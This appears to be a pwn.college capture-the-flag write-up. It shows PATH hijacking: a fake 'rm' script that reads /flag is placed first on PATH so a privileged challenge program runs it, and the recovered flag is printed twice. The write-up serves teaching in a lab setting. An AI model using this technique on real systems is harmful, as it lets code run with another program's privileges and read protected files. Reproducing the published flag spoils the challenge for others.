# Challenge 5: Hijacking Commands
"Overwriting" a command using scripts and `PATH`
## Solution
First we create a script called `rm` that will overwrite the usual functionality of the command
```
hacker@path~hijacking-commands:~$ nano rm
```
The script:
```
#!/bin/bash
/run/dojo/bin/cat /flag
```
Now, we make the script an executable using `chmod a+x`, set `PATH` to our _home_ directory and invoke `/challenge/run`
```
hacker@path~hijacking-commands:~$ chmod a+x rm
hacker@path~hijacking-commands:~$ PATH=~/
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
pwn.college{AmbbgXWH2dTflPvynoyDUKnMvmO.QX3cjM1wiMwAzNzEzW}
```

## Flag
`pwn.college{AmbbgXWH2dTflPvynoyDUKnMvmO.QX3cjM1wiMwAzNzEzW}`